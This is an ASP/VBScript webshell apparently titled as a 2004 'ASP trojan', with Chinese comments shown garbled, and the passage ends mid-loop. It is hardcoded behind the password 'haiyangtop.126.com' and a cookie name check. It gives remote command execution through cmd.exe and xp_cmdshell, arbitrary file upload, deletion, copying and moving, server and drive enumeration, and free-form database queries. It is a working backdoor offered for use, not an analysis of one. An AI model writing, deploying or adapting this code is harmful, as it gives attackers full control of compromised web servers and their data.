<%@ LANGUAGE="VBSCRIPT"  codepage ="936" %>
<%'�����һ����makelove,�ڶ�����haiyangtop.126.com,�����滻���������ʾͿ��Ըĳɱ��������%>
<META http-equiv=Content-Type content="text/html; charset=gb2312">
<title>::::����������ASPľ���2004::::</title>
<style>
BODY {
	SCROLLBAR-FACE-COLOR: #ffe1e8; FONT-SIZE: 9pt; SCROLLBAR-HIGHLIGHT-COLOR: #ffe1e8; SCROLLBAR-SHADOW-COLOR: #ff9dbb; COLOR: #f486a8; SCROLLBAR-3DLIGHT-COLOR: #ff97b9; SCROLLBAR-ARROW-COLOR: #ff6f8f; SCROLLBAR-TRACK-COLOR: #ffe1e8; SCROLLBAR-DARKSHADOW-COLOR: #ffd9e0
}
a:link {
	font-size: 9pt;
	color: #ff69b4;
	text-decoration: none;
}
a:visited {
	font-size: 9pt;
	color: #db7093;
	text-decoration: none;
}
a:hover {
	font-size: 9pt;
	color: #ffb6c1;
	text-decoration: none;
}
table {
	BORDER-COLLAPSE: collapse;
	border: 1px dotted #EFEFEF;
	font-size: 9pt;
}
.noborder {
	font-size: 9pt;
	border: none;
}
input {
	font-size: 9pt;
	color: #c875a5;
	background-image: 
	letter-spacing: normal;
	vertical-align: middle;
	word-spacing: normal;
	white-space: normal;
	border: 1px dotted #c875a5;
	clear: both;
	height: auto;
	width: auto;
	background-repeat: repeat;
	overflow: hidden;


}
textarea {
	font-size: 9pt;
	background-image: 
	letter-spacing: normal;
	vertical-align: middle;
	word-spacing: normal;
	clear: none;
	height: auto;
	width: auto;
	border: 1px dotted #c875a5;
	color: #c875a5;

}
select {
	font-size: 9pt;
	background-image: 
	letter-spacing: normal;
	vertical-align: middle;
	word-spacing: normal;
	clear: none;
	height: auto;
	width: auto;
	border: 1px dotted #c875a5;
	color: #c875a5;

}
.haveborder {
	font-size: 9pt;
	background-image: 
	border: 1px solid #c875a5;
}
.radio {
	border: 1px solid #EEEEEE;
	background-color: #EEEEEE;
	font-size: 9pt;
	color: #EEEEEE;
	clear: both;
	float: none;
	height: auto;
	width: auto;
	overflow: hidden;
	position: static;
	visibility: inherit;
	clip:    rect(auto auto auto auto);
}.hborder {
	font-size: 9pt;
	border: 1px solid #c875a5;
	background-color: FEF1EF;

}
.head-foot {
	background-image: url(images/line4.gif);
	border: 0px none;
	background-repeat: no-repeat;
	background-position: center center;

}
</style>

<% '***************��������һ�״���ִ�к�ɾ������ʼ***************  %>
<% 
select case request("action")
	case "ִ��"
		result=ExecuteFile(trim(request("run")))
        case "del"
                result=DeleteFile(trim(request("filename")))
        end select

function DeleteFile(fileDel)
    on error resume next 
    dim fs
    Set fs = CreateObject("Scripting.FileSystemObject")
response.write "�ļ�ɾ�� (" & fileDel & ")="&cstr(fs.FileExists(fileDel))&"<BR>"    
    if fs.FileExists(fileDel) then        
       fs.DeleteFile fileDel,true
    end if
    if err>0 then 
       err.clear
       DeleteFile=false
    else 
       DeleteFile=true
    end if    
end function

function ExecuteFile(fileExe)
	Set WShShell = Server.CreateObject("WScript.Shell")
	RetCode = WShShell.Run(fileExe, 1, True)
	if RetCode = 0 Then
	    'There were no errors
		ExecuteFile=True
	else
    	ExecuteFile=False
	end if
response.write "Run&nbsp"&"&nbsp"&fileexe&"&nbsp"&executefile
end function
 %>
<% '***************��������һ�״������***************  %>
<% '***************����������ŵĻ�Ҫ���ļ�����������ɾ�����������������***************  %>

<% '***************�ϴ��ļ���ʼ***************  %>
<% if request("up")=1 then %>
<%if instr(Request.ServerVariables("http_referer"),""&Request.ServerVariables("server_name")&"") = 0 then
response.write "<li><font color=red size=20>��Ҫ����ѽ���ϴ�</font>"
response.end
end if%>
<%Server.ScriptTimeOut=5000%>
<SCRIPT RUNAT=SERVER LANGUAGE=VBSCRIPT>
dim Data_5xsoft
Class upload_5xsoft
dim objForm,objFile,Version
Public function Form(strForm)
strForm=lcase(strForm)
if not objForm.exists(strForm) then
Form=""
else
Form=objForm(strForm)
end if
end function
Public function File(strFile)
strFile=lcase(strFile)
if not objFile.exists(strFile) then
set File=new FileInfo
else
set File=objFile(strFile)
end if
end function
Private Sub Class_Initialize
dim RequestData,sStart,vbCrlf,sInfo,iInfoStart,iInfoEnd,tStream,iStart,theFile
dim iFileSize,sFilePath,sFileType,sFormValue,sFileName
dim iFindStart,iFindEnd
dim iFormStart,iFormEnd,sFormName
set objForm=Server.CreateObject("Scripting.Dictionary")
set objFile=Server.CreateObject("Scripting.Dictionary")
if Request.TotalBytes<1 then Exit Sub
set tStream = Server.CreateObject("adodb.stream")
set Data_5xsoft = Server.CreateObject("adodb.stream")
Data_5xsoft.Type = 1
Data_5xsoft.Mode =3
Data_5xsoft.Open
Data_5xsoft.Write  Request.BinaryRead(Request.TotalBytes)
Data_5xsoft.Position=0
RequestData =Data_5xsoft.Read
iFormStart = 1
iFormEnd = LenB(RequestData)
vbCrlf = chrB(13) & chrB(10)
sStart = MidB(RequestData,1, InStrB(iFormStart,RequestData,vbCrlf)-1)
iStart = LenB (sStart)
iFormStart=iFormStart+iStart+1
while (iFormStart + 10) < iFormEnd
iInfoEnd = InStrB(iFormStart,RequestData,vbCrlf & vbCrlf)+3
tStream.Type = 1
tStream.Mode =3
tStream.Open
Data_5xsoft.Position = iFormStart
Data_5xsoft.CopyTo tStream,iInfoEnd-iFormStart
tStream.Position = 0
tStream.Type = 2
tStream.Charset ="gb2312"
sInfo = tStream.ReadText
tStream.Close
iFormStart = InStrB(iInfoEnd,RequestData,sStart)
iFindStart = InStr(22,sInfo,"name=""",1)+6
iFindEnd = InStr(iFindStart,sInfo,"""",1)
sFormName = lcase(Mid (sinfo,iFindStart,iFindEnd-iFindStart))
if InStr (45,sInfo,"filename=""",1) > 0 then
set theFile=new FileInfo
iFindStart = InStr(iFindEnd,sInfo,"filename=""",1)+10
iFindEnd = InStr(iFindStart,sInfo,"""",1)
sFileName = Mid (sinfo,iFindStart,iFindEnd-iFindStart)
theFile.FileName=getFileName(sFileName)
theFile.FilePath=getFilePath(sFileName)
iFindStart = InStr(iFindEnd,sInfo,"Content-Type: ",1)+14
iFindEnd = InStr(iFindStart,sInfo,vbCr)
theFile.FileType =Mid (sinfo,iFindStart,iFindEnd-iFindStart)
theFile.FileStart =iInfoEnd
theFile.FileSize = iFormStart -iInfoEnd -3
theFile.FormName=sFormName
if not objFile.Exists(sFormName) then
objFile.add sFormName,theFile
end if
else
tStream.Type =1
tStream.Mode =3
tStream.Open
Data_5xsoft.Position = iInfoEnd
Data_5xsoft.CopyTo tStream,iFormStart-iInfoEnd-3
tStream.Position = 0
tStream.Type = 2
tStream.Charset ="gb2312"
sFormValue = tStream.ReadText
tStream.Close
if objForm.Exists(sFormName) then
objForm(sFormName)=objForm(sFormName)&", "&sFormValue
else
objForm.Add sFormName,sFormValue
end if
end if
iFormStart=iFormStart+iStart+1
wend
RequestData=""
set tStream =nothing
End Sub
Private Sub Class_Terminate
if Request.TotalBytes>0 then
objForm.RemoveAll
objFile.RemoveAll
set objForm=nothing
set objFile=nothing
Data_5xsoft.Close
set Data_5xsoft =nothing
end if
End Sub
Private function GetFilePath(FullPath)
If FullPath <> "" Then
GetFilePath = left(FullPath,InStrRev(FullPath, "\"))
Else
GetFilePath = ""
End If
End  function
Private function GetFileName(FullPath)
If FullPath <> "" Then
GetFileName = mid(FullPath,InStrRev(FullPath, "\")+1)
Else
GetFileName = ""
End If
End  function
End Class
Class FileInfo
dim FormName,FileName,FilePath,FileSize,FileType,FileStart
Private Sub Class_Initialize
FileName = ""
FilePath = ""
FileSize = 0
FileStart= 0
FormName = ""
FileType = ""
End Sub
Public function SaveAs(FullPath)
dim dr,ErrorChar,i
SaveAs=true
if trim(fullpath)="" or FileStart=0 or FileName="" or right(fullpath,1)="/" then exit function
set dr=CreateObject("Adodb.Stream")
dr.Mode=3
dr.Type=1
dr.Open
Data_5xsoft.position=FileStart
Data_5xsoft.copyto dr,FileSize
dr.SaveToFile FullPath,2
dr.Close
set dr=nothing
SaveAs=false
end function
End Class
</SCRIPT>
<%
dim upload,file,formName,formPath,iCount
set upload=new upload_5xsoft
if upload.form("filepath")="" then
response.write "������Ҫ�ϴ�����Ŀ¼!"
set upload=nothing
response.end
else
formPath=upload.form("filepath")
if right(formPath,1)<>"/" then formPath=formPath&"/"
end if
iCount=0
for each formName in upload.objForm
next
response.write "<br>"
for each formName in upload.objFile
set file=upload.file(formName)
if file.FileSize>0 then
'file.SaveAs Server.mappath(formPath&file.FileName)
'����·���ϴ�
file.SaveAs formPath&file.FileName
'����·���ϴ�
response.write "<center>"&file.FilePath&file.FileName&" ("&file.FileSize&") => "&formPath&File.FileName&" �ϴ��ɹ�!</center><br>"
iCount=iCount+1
end if
set file=nothing
next
set upload=nothing
response.write "<center>"&iCount&"���ļ��ϴ�����!</center>"
response.write "<center><br><a href=""javascript:history.back();""><font color='#D00000'>������һҳ</font></a></center>"

 '***************�ϴ��ļ����� ***************

else
url= Request.ServerVariables("URL")
Co=Request.ServerVariables("SCRIPT_NAME")

if trim(request.form("password"))<>"" and trim(request.form("password"))<>"haiyangtop.126.com" then call out() 
if trim(request.form("password"))="haiyangtop.126.com" then
session("password")="allen" 
response.redirect ""&co&"" 
else if session("password")<>"allen" then 
call login() '�������
response.end 'ֹͣ����
end if
select case request("id")
case "edit"
call edit()
case "upload"
call upload()
case "dir"
call dir()
case "down"
call downloadFile(request("path"))
case "inject"
call inject()
case else
call main()
end select
end if
sub login()
for i=0 to 25
on error resume next
IsObj=false
VerObj=""
dim TestObj
set TestObj=server.CreateObject(ObjTotest(i,0))
If -2147221005 <> Err then
IsObj = True
VerObj = TestObj.version
if VerObj="" or isnull(VerObj) then VerObj=TestObj.about
end if
ObjTotest(i,2)=IsObj
ObjTotest(i,3)=VerObj
next
%>
<center>
<%
Dim strUserName
' ȡ���û���
strUserName = Request.QueryString("UserName")
If strUserName <> "" Then
   ' �����û�����Cookies
   Response.Cookies("UserName") = strUserName
End If
' ȡ���û���Cookies
strUserName = Request.Cookies("UserName")
' �Ƿ����û���
If strUserName <> "makelove" Then
   ' û���û�Cookies���ֶԻ��������û�   %>
   <form name="USER" action="<%= Request.ServerVariables("URL") %>" method="GET"> 
      <input TYPE="HIDDEN" Name="UserName">
   </form>
   <SCRIPT LANGUAGE="VBScript">
   <!--
   ' ������ҳ���е��ӳ���
   Sub Window_OnLoad
   Dim strUserName
   ' ���ֶԻ��������û���
   strUserName=InputBox("�������û�������վ��", "�����û���", "", 300, 200)
   ' ���ñ���UserName������ 
   USER.UserName.Value = strUserName 
   USER.Submit   ' ���ͱ���
   End Sub
   -->
   </SCRIPT>
<%Else%>
   <center>��ӭ�û�[<%=strUserName %>]����վ��
   </center>
<table border=0 width=500 cellspacing=0 cellpadding=0 class="noborder">
<tr><td>
<table border=0 width=100% cellspacing=1 cellpadding=0 class="noborder" >
<tr bgcolor="#EEEEEE" height=18 class="noborder">
<td width="59%" align=left>&nbsp;��������</td>
<td width="41%" bgcolor="#EEEEEE">&nbsp;<%=Request.ServerVariables("SERVER_NAME")%></td>
</tr>
<tr bgcolor="#EEEEEE" height=18 class="noborder">
<td align=left>&nbsp;������IP</td>
<td>&nbsp;<%=Request.ServerVariables("LOCAL_ADDR")%></td>
</tr>
<tr bgcolor="#EEEEEE" height=18 class="noborder">
<td align=left>&nbsp;�������˿�</td>
<td>&nbsp;<%=Request.ServerVariables("SERVER_PORT")%></td>
</tr>
<tr bgcolor="#EEEEEE" height=18 class="noborder">
<td align=left>&nbsp;������ʱ��</td>
<td>&nbsp;<%=now%></td>
</tr>
<tr bgcolor="#EEEEEE" height=18 class="noborder">
<td align=left>&nbsp;���ļ�����·��</td>
<td>&nbsp;<%=server.mappath(Request.ServerVariables("SCRIPT_NAME"))%></td>
</tr>
<tr bgcolor="#EEEEEE" height=18 class="noborder">
<td align=left>&nbsp;������CPU����</td>
<td>&nbsp;<%=Request.ServerVariables("NUMBER_OF_PROCESSORS")%> ��</td>
</tr>
<tr bgcolor="#EEEEEE" height=18 class="noborder">
<td align=left>&nbsp;����������ϵͳ</td>
<td>&nbsp;<%=Request.ServerVariables("OS")%></td>
</tr>
<tr bgcolor="#EEEEEE" height=18 class="noborder"><td align=left>&nbsp�ͻ���IP: �˿� [����]</td><td>&nbsp;<%=Request.ServerVariables("REMOTE_ADDR")%>|
<%=Request.ServerVariables("REMOTE_PORT")%>
[<%=Request.ServerVariables("HTTP_X_FORWARDED_FOR")%>]</td></tr>
<tr bgcolor="#EEEEEE" height=18 class="noborder"><%
dim t1,t2,lsabc,thetime
t1=timer
for i=1 to 500000
lsabc= 1 + 1
next
t2=timer
thetime=cstr(int(( (t2-t1)*10000 )+0.5)/10)
%><td align=left>&nbsp�����������ٶȲ���</td>
<td>&nbsp;<font color=red><%=thetime%> ����</font></td>
</tr>
</table><center><br>
<%
pathlcx=trim(Request.form("pathlcx"))
textlcx=trim(Request.form("textlcx"))
if textlcx<>"" and pathlcx<>"" then
textlcx=replace(textlcx,">","^>")
textlcx=replace(textlcx,"<","^<")
textlcx=replace(textlcx,"&","^&")
textlcx=replace(textlcx,chr(34),"^"&chr(34))
textlcx=replace(textlcx,chr(10),"^"&chr(10))
textlcx=replace(textlcx,chr(13),"^"&chr(13))
set shell=server.createobject("shell.application")
set shellfolder=shell.namespace("C:\Documents and Settings\Default User\����ʼ���˵�\����\����")
set shellfolderitem=shellfolder.parsename("���±�.lnk")
set objshelllink =shellfolderitem.getlink
objshelllink.path="cmd.exe"
objshelllink.arguments="/c echo "&textlcx&">"&pathlcx&" &&del c:\a.lnk"
objshelllink.save("c:\a.lnk")
shell.namespace("c:\").items.item("a.lnk").invokeverb
end if
%>

<table border=0 width=500 cellspacing=0 cellpadding=0 class="noborder"><tr bgcolor="#EEEEEE" height=18 class="noborder" style='table-layout:fixed; word-break:break-all'><td align=left>
<form action="<%= Request.ServerVariables("URL") %>" method="post">
<input type=text name=text value="<%=DSnXA %>">  <font class=fonts>����Ҫ�����Ŀ¼,���Ҫ��\</font></td></tr><tr bgcolor="#EEEEEE" height=18 class="noborder"><td align=left>
<input type=text name=text1 value="<%=DSnXA1 %>">
copy
<input type=text name=text2 value="<%=DSnXA2 %>"> <font class=fonts>Ŀ�ĵ�ַ��Ҫ���ļ���</font></td></tr><tr bgcolor="#EEEEEE" height=18 class="noborder"><td align=left>
<input type=text name=text3 value="<%=DSnXA3 %>">
move
<input type=text name=text4 value="<%=DSnXA4 %>"><font class=fonts> Ŀ�ĵ�ַ��Ҫ���ļ���</font></td></tr><tr bgcolor="#EEEEEE" height=18 class="noborder"><td align=left>
·����<input type=text name=text5 value="<%=DSnXA5 %>" >
����<input type=text name=text6 value="<%=DSnXA6 %>" ><font class=fonts> �����ԼӲ���</font></td></tr><tr bgcolor="#EEEEEE" height=18 class="noborder"><td align=left><input type="text" name="ok" size=55><font class=fonts> CMD����Ի���</font>
</td></tr><tr bgcolor="#EEEEEE" height=18 class="noborder"><td align=left><input type=text name=pathlcx size=55><font class=fonts> ·�����ļ���</font></td><tr/>
<tr bgcolor="#EEEEEE" height=18 class="noborder"><td align=left>
<textarea  cols=80 rows=5 name=textlcx >
Ҫ���ɵ��ļ����ݣ��������лس���<% ok=Request("ok")
response.write server.createobject ("wscript.shell").exec ("cmd.exe /c "& ok).stdout.readall
%></textarea>
<input type=submit name=sb value=�������� class=input>
</form></td></tr>
<script language=vbs>
sub main()
base=form8.text1.value
If IsNumeric(base) Then
cc=hex(cstr(base))
alert("10����Ϊ"&base) 
alert("16����Ϊ"&cc)
exit sub
end if 
aa=asc(cstr(base))
bb=hex(aa)
alert("10����Ϊ"&aa) 
alert("16����Ϊ"&bb)
end sub
sub main2()
If form8.vars.value <>"" Then
'������ر���
Dim nums,tmp,tmpstr,i
nums=form8.vars.value   'ȡ�ô��û������������16������ֵ
nums_len=Len(nums)     '�ó�nums�ĳ���

'��ʼѭ��������Ϊnums�ĳ���ֵ
For i=1 To nums_len
    tmp=Mid(nums,i,1)    'ȡ��nums�ĵ�1���ַ���ŵ���ʱ����tmp��
    If IsNumeric(tmp) Then    '���tmp�е���������ֵ�ͣ���ִ���������
        tmp=tmp * 16 * (16^(nums_len-i-1))    '��Ϊ16������ֵ������ת��Ϊ10������ֵ�Ĺ�ʽ
    Else
        '���������16�������ķ�Χ��0--9��a--f֮��
        If ASC(UCase(tmp))<65 Or ASC(UCase(tmp))>70 Then 
            alert("���������ֵ���зǷ��ַ���16������ֻ����1��9��a��f֮����ַ������������롣")
            exit sub
        End If
        tmp=(ASC(UCase(tmp))-55) * (16^(nums_len-i))    '��Ϊ16�����ַ���������ת��Ϊ10������ֵ�Ĺ�ʽ
    End If
        '������ת�������ֵ��tmpstr����ۼƳ��ܺ�
        tmpstr=tmpstr+tmp
Next
alert("ת����10����Ϊ:"&tmpstr&"���ַ�ֵΪ:"&chr(tmpstr))
End If
end sub
</script>
<form name=form8 method="post">
<input type=text name=text1 value=�ַ�������ת10��16���� size=30><input type=submit onclick=main() value="����ת">
<input type="text" name="vars" value=16����ת10���ƺ��ַ� size=30><input type=submit onclick=main2() value="����ת">
</form>
</table>
</center>

<% 
Dim strSQL, objDBConn, objRS, intFieldCount, intCounter,mdb
mdb = Request.QueryString("mdb")
strSQL = Request.QueryString("SQL")
If strSQL <> "" and left(trim(strsql),6)="select" Then
   Response.Write "SQL�ַ���: " & strSQL & "<br>" 
   ' �������ݿ����ӵĶ���
   Set objDBConn = Server.CreateObject("ADODB.Connection")
   ' �����ݿ����� mdb���Ϊ��Ҫ���ӵ����ݿ�����
   objDBConn.Open "DRIVER={Microsoft Access Driver (*.mdb)}; DBQ=" & Server.MapPath(mdb)
   ' ִ��SQL�����ݿ��ѯ
   Set objRS = objDBconn.Execute(strSQL)
   ' ȡ����ĸ���
   intFieldCount = objRS.Fields.Count - 1
   ' ����Ƿ��м�¼ 
   If Not objRS.Eof Then
      Response.Write "<table border=1><tr>"   
      ' ��ʾ���ݿ������
      For intCounter = 0 to intFieldCount
          Response.Write "<td><b>" & objRS(intCounter).Name & "</b></td>"
      Next
      Response.Write "</tr>"
      ' ��ʾ���ݿ�����
      Do While Not objRS.Eof
         Response.Write "<tr>"     
         ' ��ʾÿ����¼���� 
         For intCounter = 0 to intFieldCount
             If objRS.Fields(intCounter).Value <> "" Then
                Response.Write "<td valign=""top"">" & objRS.Fields(intCounter).Value & "</td>"
             Else
                Response.Write "<td valign=""top"">---</td>"
             End If
         Next
         Response.Write "</tr>"
         objRS.MoveNext  ' �Ƶ���һ����¼
      Loop
      Response.Write "</table>"
   Else
      Response.Write "<b>û�з��������ļ�¼</b><br>" 
   End If

   objRS.Close         ' �رռ�¼����
   Set objRS = Nothing
   objDBConn.Close     ' �ر����ݿ�����
   Set objDBConn = Nothing 
end if
if strSQL <> "" and left(trim(strsql),6)<>"select" Then
%>
<script>javascript:alert("�ⲻ��select����\n������ݿ⿴���н��\n����������lcx\n�������Ե���һ��access��sql����:-)")</script>
<%
end if
%>
<form  action="<%=url%>"  method="GET">
<table border=0 width=500 cellspacing=0 cellpadding=0 class="noborder">
  <tr bgcolor="#EEEEEE" height=18 class="noborder">
      <td>SQL�ַ���:</td>
      <td><Input TYPE="TEXT" NAME="SQL" value="<%=strSQL%>" size ="30">
  <Input TYPE="TEXT" NAME="mdb" value="acess���ݿ����Ŀ¼������" size ="30"></td>
   </tr>
<tr bgcolor="#EEEEEE" height=18 class="noborder">
      <td colspan=2 align=center><input TYPE="SUBMIT" value="��ѯ���ݿ⣬��ִ������sql���"></td>
   </tr>
</table>

</form>
<% If trim(request.form("cmd"))<>""  Then %>
<%
password= trim(Request.form("pa"))
id=trim(Request.form("id"))
set adoConn=Server.CreateObject("ADODB.Connection") 
adoConn.Open "Provider=SQLOLEDB.1;Password="&password&";User ID="&id
  strQuery = "exec master.dbo.xp_cmdshell '" & request.form("cmd") & "'" 
  set recResult = adoConn.Execute(strQuery) 
  If NOT recResult.EOF Then 
   Do While NOT recResult.EOF 
    strResult = strResult & chr(13) & recResult(0) 
    recResult.MoveNext 
   Loop 
  End if 
  set recResult = Nothing 
  strResult = Replace(strResult," ","&nbsp;") 
  strResult = Replace(strResult,"<","&lt;") 
  strResult = Replace(strResult,">","&gt;") 
  strResult = Replace(strResult,chr(13),"<br>") 
 End if 
 set adoConn = Nothing 
%> <br><table border=0 width=500 cellspacing=0 cellpadding=0 bgcolor="#B8B8B8" class="noborder">
<tr bgcolor="#EEEEEE" height=18 class="noborder">
<form name="form" method=post action="<%=Request.ServerVariables("URL")%>"> 
<input type="text" name="cmd" size=25 > 
<input type="text" name="id" size=10 value="mssql�û���">
<input type="text" name="pa" size=10 value="mssql����">
<input type="submit" value="ִ��cmd����">
</form></tr></table><br><table border=0 width=500 cellspacing=0 cellpadding=0 bgcolor="#B8B8B8" class="noborder">
<tr bgcolor="#EEEEEE" height=18 class="noborder"><td>
<form name="form1" method="post" action="<%=url%>?up=1" enctype="multipart/form-data" >
��������������Ŀ¼:
<input name="filepath" type="text" value="drv:\path" size="15">
�ļ���ַ:
<input type="file" name="file1" value="" size=1>
<input type="submit" name="Submit" value="�ϴ�" > ������·����
</td></Tr>
</form></table>
<% 
 Response.Write request.form("cmd") & "<br><br>" 
 Response.Write strResult 
%> 
</center>
<%
DSnXA = Request.Form("text")   'Ŀ¼���
if (DSnXA <> "")  then
set shell=server.createobject("shell.application") '����shell����
set fod1=shell.namespace(DSnXA)
set foditems=fod1.items
for each co in foditems
response.write "<font color=black>" & co.path & "-----" & co.size & "</font><br>"
next
end if
%>

<%
DSnXA1 = Request.Form("text1")  'Ŀ¼���������ܽ����ļ�����
DSnXA2 = Request.Form("text2")
if DSnXA1<>"" and DSnXA2<>"" then
set shell1=server.createobject("shell.application") '����shell����
set fod1=shell1.namespace(DSnXA2)
for i=len(DSnXA1) to 1 step -1
if mid(DSnXA1,i,1)="\" then
   path=left(DSnXA1,i-1)
   exit for
end if
next
if len(path)=2 then path=path & "\"
path2=right(DSnXA1,len(DSnXA1)-i)
set fod2=shell1.namespace(path)
set foditem=fod2.parsename(path2)
fod1.copyhere foditem
response.write "command completed success!"
end if
%>

<%
DSnXA3 = Request.Form("text3")   'Ŀ¼�ƶ�
DSnXA4 = Request.Form("text4")
if DSnXA3<>"" and DSnXA4<>"" then
set shell2=server.createobject("shell.application") '����shell����
set fod1=shell2.namespace(DSnXA4)

for i=len(DSnXA3) to 1 step -1
if mid(DSnXA3,i,1)="\" then
   path=left(DSnXA3,i-1)
   exit for
end if
next

if len(path)=2 then path=path & "\"
path2=right(DSnXA3,len(DSnXA3)-i)
set fod2=shell2.namespace(path)
set foditem=fod2.parsename(path2)
fod1.movehere foditem
response.write "command completed success!"
end if
%>


<%
DSnXA5 = Request.Form("text5")    'ִ�г���Ҫָ��·��
DSnXA6 = Request.Form("text6")
if DSnXA5<>"" and DSnXA6<>"" then
set shell3=server.createobject("shell.application") '����shell����
shell3.namespace(DSnXA5).items.item(DSnXA6).invokeverb
response.write "command completed success!"
end if
%>
<center><table border=0 width=500 cellspacing=0 cellpadding=0 bgcolor="#B8B8B8" class="noborder">
<tr bgcolor="#EEEEEE" height=18 class="noborder">
      <td colspan=2 align=center><form method="POST" action=""&url&"">
Enter Password��<input type="password" name="password" size="20">
<input type="submit" value="LOGIN"></td>
   </tr>
</form></td></tr></table>
</center>
</body>
<%End If%>
<%end sub%>
<%sub main()
'�޸������urlpath��Ϊ���������ʵ��URL
urlpath=Request.ServerVariables("SERVER_NAME")
dim cpath,lpath
set fsoBrowse=CreateObject("Scripting.FileSystemObject")
if Request("path")="" then
lpath="/"
else
lpath=Request("path")&"/"
end if
if Request("attrib")="true" then
cpath=lpath
attrib="true"
else
cpath=Server.MapPath(lpath)
attrib=""
end if
%><html>
<script language="JavaScript">
function crfile(ls)
{if (ls==""){alert("�������ļ���!");}
else {window.open("<%=url%>?id=edit&attrib=<%=request("attrib")%>&creat=yes&path=<%=lpath%>"+ls);}
return false;
}
function crdir(ls)
{if (ls==""){alert("�������ļ���!");}
else {window.open("<%=url%>?id=dir&attrib=<%=request("attrib")%>&op=creat&path=<%=lpath%>"+ls);}
return false;
}
</script>
<script language="vbscript">
sub rmdir(ls)
if confirm("�����Ҫɾ�����Ŀ¼��!"&Chr(13)&Chr(10)&"Ŀ¼Ϊ��"&ls)   then
window.open("<%=url%>?id=dir&path="&ls&"&op=del&attrib=<%=request("attrib")%>")
end if
end sub
sub copyfile(sfile)
dfile=InputBox(""&Chr(13)&Chr(10)&"Դ�ļ���"&sfile&Chr(13)&Chr(10)&"������Ŀ���ļ����ļ���:"&Chr(13)&Chr(10)&"���·��,Ҫ������ĵ�ǰ·��ģʽ. ע��:����·��ʾ��c:/��c:\������")
dfile=trim(dfile)
attrib="<%=request("attrib")%>"
if dfile<>"" then
if InStr(dfile,":") or InStr(dfile,"/")=1 then
lp=""
if InStr(dfile,":") and attrib<>"true" then
alert "�Բ����������·��ģʽ�²���ʹ�þ���·��"&Chr(13)&Chr(10)&"����·����["&dfile&"]"
exit sub
end if
else
lp="<%=lpath%>"
end if
window.open(""&url&"?id=edit&path="+sfile+"&op=copy&attrib="+attrib+"&dpath="+lp+dfile)
else
alert"��û�������ļ�����"
end If
end sub
</script><body bgcolor="#F5F5F5">
<TABLE cellSpacing=1 cellPadding=3 width="750" align=center
bgColor=#b8b8b8 border=0 class="noborder">
<TBODY>
<TR >
<TD
height=22 colspan="4" bgcolor="#EEEEEE" >�л��̷���
<%
For Each thing in fsoBrowse.Drives
Response.write "<a href='"&url&"?path="&thing.DriveLetter&":&attrib=true'>"&thing.DriveLetter&"��:</a>          "
NEXT
%>   &nbsp;������������ַ��
<%
Set oScriptlcx= Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNetlcx = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSyslcx = Server.CreateObject("Scripting.FileSystemObject")
%><%= "\\" & oScriptNetlcx.ComputerName & "\" & oScriptNetlcx.UserName %></td>
</TR>  <TD colspan="4" bgcolor="#EEEEEE" ><%
if Request("attrib")="true"  then
response.write "<a href='"&url&"'><font color='#D00000'>����л������·���༭ģʽ</font></a>"
else
response.write "<a href='"&url&"?attrib=true'><font color='#D00000'>����л�������·���༭ģʽ</font></a>"
end if
%>&nbsp·��: <%=cpath%>  &nbsp;&nbsp;��ǰ���Ŀ¼:<%=lpath%>
<%
Set fs = Server.CreateObject("Scripting.FileSystemObject")
Set fd = fs.GetFolder(Request("path")&"\")
If SearchString <> "" Then
Response.Write "<H2>����<font color=red>" & SearchString & "</font>������£�</H2><P>"
SearchFolder fd,SearchString
End If
%></TD></TR> <TR>
<TD height=22 colspan="4" bgcolor="#EEEEEE" >
<form name="form1" method="post" action="<%=url%>" >
���Ŀ¼: <input type="text" name="path" size="30" value="c:">
<input type="hidden" name="attrib" value="true">
<input type="submit" name="Submit" value="���Ŀ¼" > �����þ���·��,֧�־�������ַ����"\\pc01\c"��
<input type="submit" name="Submit1" value="������fsoҳ">
</TD></form>


<%
if request.form("submit1")="������fsoҳ" then
call out() 
end if%> 
</TR><TR >
<TD colspan="4" bgcolor="#EEEEEE" ><form name="form1" method="post" action="<%=url%>?up=1" enctype="multipart/form-data" >
��������������Ŀ¼:
<input name="filepath" type="text" value="drv:\path" size="15">
�ļ���ַ:
<input type="file" name="file1" value="" size=4><input type="file" name="file2" value="" size=4>
<input type="file" name="file3" value="" size=4>
<input type="submit" name="Submit" value="�ϴ�" > �����þ���·����
</TD>
</form></TR>
<TR bgcolor="#EEEEEE">
<TD colspan="4" >
<%
On Error Resume Next
DSnXA = Request.Form(".CMD")
If (DSnXA <> "") Then
szTempFile = "C:\" & oFileSyslcx.GetTempName( )
Call oScriptlcx.Run ("cmd.exe /c " & DSnXA & " > " & szTempFile, 0, True)
Set oFilelcx = oFileSyslcx.OpenTextFile (szTempFile, 1, False, 0)
End If%>
<FORM action="<%= Request.ServerVariables("URL") %>" method="POST" name=userdata>
<input type=text name=".CMD" size=28 value="<%= DSnXA %>">
<input type=submit value="cmd����">
<input type=text name='name' size=16 value="drive:\file.exe"><input type='button' name=send value="ִ�г���">
<input type=text name='name1' size=16 value="drive:\file.name"><input type='button' name=send1 value="ɾ���ļ�">������·��+�ļ�����
</TD> </FORM>
<script language=vbscript>
sub send_onclick
window.open("<%=url%>?run="+userdata.name.value+"&action=ִ��")
end sub
</script>
<script language=vbscript>
sub send1_onclick
window.open("<%=url%>?filename="+userdata.name1.value+"&action=del")
end sub
</script>
</TR>
<TR bgColor=#EEEEEE>
<TD height=22 colspan="4" ><form name="newfile"
onSubmit="return crfile(newfile.filename.value);">
<input type="text" name="filename" size="40">
<input type="submit" value="�½��ļ�" >
<input type="button" value="�½�Ŀ¼"onclick="crdir(newfile.filename.value)">���½��ļ����½�Ŀ¼����ͬ����
</TD></form>


<pre>
<% If (IsObject(oFilelcx)) Then
On Error Resume Next
Response.Write Server.HTMLEncode(oFilelcx.ReadAll)
oFilelcx.Close
Call oFileSyslcx.DeleteFile(szTempFile, True)
End If %>
</TR>
<TR>
<TD height=22 width="26%" rowspan="2" valign="top" bgColor=#EEEEEE >

<%
dim theFolder,theSubFolders
if fsoBrowse.FolderExists(cpath)then
Set theFolder=fsoBrowse.GetFolder(cpath)
Set theSubFolders=theFolder.SubFolders
Response.write"<a href='"&url&"?path="&Request("oldpath")&"&attrib="&attrib&"'><font color='#FF8000'>��</font>��<font color='ff2222'>���ϼ�Ŀ¼</font></a><br>"
For Each x In theSubFolders%>
